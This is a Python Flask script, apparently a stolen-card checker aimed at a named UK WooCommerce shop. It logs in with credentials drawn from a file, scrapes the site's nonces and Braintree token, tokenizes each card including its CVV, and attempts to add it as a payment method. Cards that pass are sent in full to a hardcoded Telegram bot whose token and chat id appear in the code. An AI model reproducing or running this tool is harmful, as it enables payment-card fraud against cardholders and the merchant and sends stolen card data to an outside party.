from flask import Flask, request, jsonify
import requests
import base64
import json
import uuid
import random

app = Flask(__name__)

def parseX(content, start, end):
    try:
        idx1 = content.index(start) + len(start)
        idx2 = content.index(end, idx1)
        return content[idx1:idx2].strip()
    except ValueError:
        return None

def load_creds(filename="creds.txt"):
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()
            creds = [line.strip() for line in lines if ":" in line]
            if not creds:
                raise Exception("No valid credentials found in creds.txt")
            email, password = random.choice(creds).split(":")
            return email, password
    except Exception as e:
        raise Exception(f"Failed to load creds: {str(e)}")

class Landleleo:
    def __init__(self, card, mm, yyyy, cvv):
        self.session = requests.Session()
        self.url = "https://www.rigol-uk.co.uk/my-account/"
        self.url2 = "https://www.rigol-uk.co.uk/my-account/add-payment-method/"
        self.url3 = "https://payments.braintree-api.com/graphql"
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10...)",
            'Accept': "text/html,...",
            'referer': self.url,
            'origin': "https://www.rigol-uk.co.uk"
        }
        self.card = card
        self.mm = mm
        self.yyyy = yyyy
        self.cvv = cvv
        self.email, self.password = load_creds()

    def chk(self):
        result = {"Card": f"{self.card}|{self.mm}|{self.yyyy}|{self.cvv}"}
        try:
            # Step 1: Get Nonce
            r1 = self.session.get(self.url, headers=self.headers, timeout=15).text
            nonce = parseX(r1, 'name="woocommerce-login-nonce" value="', '"')
            if not nonce:
                result.update({"status": False, "CODE": "WOO_NONCE_MISSING", "Message": "Failed to find login nonce"})
                return result

            # Step 2: Login
            payload = {
                'username': self.email,
                'password': self.password,
                'woocommerce-login-nonce': nonce,
                '_wp_http_referer': "/my-account/",
                'login': "Log in"
            }
            r2 = self.session.post(self.url, data=payload, headers=self.headers, timeout=15)
            if "woocommerce-MyAccount-content" not in r2.text:
                result.update({"status": False, "CODE": "LOGIN_FAILED", "Message": "Login failed"})
                return result

            # Step 3: Get Braintree Token
            r3 = self.session.get(self.url2, headers=self.headers, timeout=15).text
            add_nonce = parseX(r3, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            token = parseX(r3, 'wc_braintree_client_token = ["', '"]')
            if not token:
                result.update({"status": False, "CODE": "BRAINTREE_TOKEN_MISSING", "Message": "Failed to find Braintree token"})
                return result

            decoded_token = base64.b64decode(token).decode("utf-8")
            authority = json.loads(decoded_token)["authorizationFingerprint"]

            # Step 4: Tokenize Card
            gql_payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": str(uuid.uuid4())
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": self.card,
                            "expirationMonth": self.mm,
                            "expirationYear": self.yyyy[-2:],  # last 2 digits
                            "cvv": self.cvv,
                            "billingAddress": {
                                "postalCode": "OX10 9SD",
                                "streetAddress": "Street 73"
                            }
                        },
                        "options": {
                            "validate": False
                        }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }

            headers_tokenize = {
                'User-Agent': self.headers['User-Agent'],
                'authorization': f"Bearer {authority}",
                'Content-Type': "application/json",
                'braintree-version': "2018-05-10",
                'origin': "https://assets.braintreegateway.com",
                'referer': "https://assets.braintreegateway.com/"
            }

            res = self.session.post(self.url3, json=gql_payload, headers=headers_tokenize, timeout=15)
            res_json = res.json()
            print(res_json)  # Debugging line to check the response

            tok_key = res_json.get('data', {}).get('tokenizeCreditCard', {}).get("token")
            if not tok_key:
                result.update({"status": False, "CODE": "TOKENIZE_FAILED", "Message": "Failed to tokenize card"})
                return result

            # Step 5: Add Payment Method
            final_payload = {
                'payment_method': "braintree_cc",
                'braintree_cc_nonce_key': tok_key,
                'braintree_cc_device_data': "{\"device_session_id\":\"" + str(uuid.uuid4()).replace('-', '') + "\",\"fraud_merchant_id\":null,\"correlation_id\":\"" + str(uuid.uuid4()) + "\"}",
                'braintree_cc_3ds_nonce_key': "",
                'braintree_cc_config_data': json.dumps({
                    "environment": "production",
                    "clientApiUrl": "https://api.braintreegateway.com:443/merchants/wrc3bg2v37npq78r/client_api",
                    "assetsUrl": "https://assets.braintreegateway.com",
                    "analytics": {"url": "https://client-analytics.braintreegateway.com/wrc3bg2v37npq78r"},
                    "merchantId": "wrc3bg2v37npq78r",
                    "venmo": "off",
                    "graphQL": {"url": "https://payments.braintree-api.com/graphql", "features": ["tokenize_credit_cards"]},
                    "creditCards": {
                        "supportedCardTypes": ["Discover", "Maestro", "UK Maestro", "MasterCard", "Visa", "American Express"]
                    },
                    "threeDSecureEnabled": True,
                    "paypalEnabled": True
                }),
                'woocommerce-add-payment-method-nonce': add_nonce,
                '_wp_http_referer': "/my-account/add-payment-method/",
                'woocommerce_add_payment_method': "1"
            }

            headers_final = {
                'User-Agent': self.headers['User-Agent'],
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*",
                'origin': "https://www.rigol-uk.co.uk",
                'referer': self.url2
            }

            final = self.session.post(self.url2, data=final_payload, headers=headers_final, timeout=15)
            if "Payment method added successfully" in final.text or "Payment method successfully added." in final.text:
                result.update({"status": True, "CODE": "AUTH_APPROVE", "Message": "Card Approved"})
                bot_token = "7872507180:AAETKEbeNF_y5P-gCPE9BcG1vI12jhtVoq4"
                chat_id = "-1002565878499"
                message = f"? Approved: {self.card}|{self.mm}|{self.yyyy}|{self.cvv}\nOwner: @zi0xe"
                telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
                try:
                    requests.post(telegram_url, data=payload)
                except Exception as e:
                    print("Failed to send Telegram message:", e)
                    
            else:
                error_message = "Unknown error"
                if "Reason:" in final.text:
                    try:
                        error_message = final.text.split("Reason:")[1].split("</li>")[0]
                        print(error_message)
                    except:
                        pass
                result.update({"status": False, "CODE": "AUTH_DECLINE", "Message": error_message.strip()})

        except Exception as e:
            result.update({"status": False, "CODE": "UNKNOWN_ERROR", "Message": str(e)})
        finally:
            return result

# @app.route('/chk', methods=['GET'])
# def chk_card():
#     card_data = request.args.get('card')
#     if not card_data or "|" not in card_data:
#         return jsonify({"status": False, "CODE": "INVALID_PARAMETER", "Message": "Missing or invalid 'card' parameter. Format: card|mm|yyyy|cvv"}), 400

#     try:
#         card, mm, yyyy, cvv = card_data.strip().split("|")
#     except ValueError:
#         return jsonify({"status": False, "CODE": "INVALID_CARD_FORMAT", "Message": "Invalid card format. Must be card|mm|yyyy|cvv"}), 400

#     checker = Landleleo(card, mm, yyyy, cvv)
#     result = checker.chk()
#     return jsonify(result)

# if __name__ == "__main__":
#     app.run(host='0.0.0.0', port=5000)